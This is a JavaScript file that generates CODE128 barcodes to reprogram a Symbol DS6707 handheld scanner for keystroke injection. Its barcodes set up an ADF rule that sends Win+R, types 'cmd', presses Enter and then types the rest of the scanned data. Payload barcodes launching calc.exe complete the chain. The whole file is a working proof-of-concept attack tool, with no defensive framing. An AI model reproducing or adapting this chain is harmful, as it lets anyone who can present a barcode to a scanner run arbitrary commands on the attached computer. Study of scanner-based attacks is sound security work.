$(function  () {
  $("ol.example").sortable();
});

// DS6707 CODE128 No enter config

var models = [
	{
		name: "Symbol DS6707",
		autodelay: 500,
		setup: {
			symbology: "CODE128",
			prefix: "\x80",
			postfix: "",
			enterconfig: [
				"2050207", // CODE128 Presentation mode scanning ("Blink")
				"1040601" // CODE128 Enable parameter scanning
			],
			exitconfig: []
		}
		
		// Using ADF with longer bar codes transmits the bar code in segments of length 252 or less (depending on the host selected), and applies the rule to each segment.
	}
];

var example = {
	symbology: "CODE128",
	setup: [
	
		"N02CC03", // CODE128 Mobile Phone Decode Enable
		"N02D60D" // CODE128 Mobile Phone Decode High Aggressive
		//"60", // CODE128 Erase all rules
	],
	replacements: [
		[
			"7B1211", // CODE128 begin new rule
			"6C201", // CODE128 specific string at start (max 8)
			"`1", // `1
			"B+", // CODE128 end of message
			"20C0D20063", // CODE128 specify pause duration
			"A1", "A5", // 1.0 second delay
			"6A144352", // CODE128 send Win + R
			"6A118", // CODE128 send pause
			"cmd",
			"6A14470D", // CODE128 send enter
			"6A118", // CODE128 send pause
			"6A110", // CODE128 send all data that remains
			"B+", // CODE128 end of message
			"4" // CODE128 save rule
		]
	],
	payload: [
		"`1calc.exe",
		"8*17*39103"
	]
};


function addBarcode(text, options) {
	var canvas = $("<canvas/>");
	$("#barcodes").append($("<li>").append(canvas));
	canvas.JsBarcode(text, options);
}

$(function () {	
	var model = models[0];
	var script = example;
	
	if (script.setup.length > 0) {
		for (var i = 0; i < model.setup.enterconfig.length; i++)
		{
			addBarcode(model.setup.prefix + model.setup.enterconfig[i] + model.setup.postfix, {format: model.setup.symbology});
		}
		for (var i = 0; i < script.setup.length; i++)
		{
			addBarcode(model.setup.prefix + script.setup[i] + model.setup.postfix, {format: model.setup.symbology});
		}
		for (var i = 0; i < model.setup.exitconfig.length; i++)
		{
			addBarcode(model.setup.prefix + model.setup.exitconfig[i] + model.setup.postfix, {format: model.setup.symbology});
		}
	}
	
	for (var i = 0; i < script.replacements.length; i++)
	{
		for (var j = 0; j < script.replacements[i].length; j++)
		{
			addBarcode(script.replacements[i][j], {format: model.setup.symbology});
		}
	}
	
	for (var i = 0; i < script.payload.length; i++)
	{
		addBarcode(script.payload[i], {format: script.symbology});
	}
});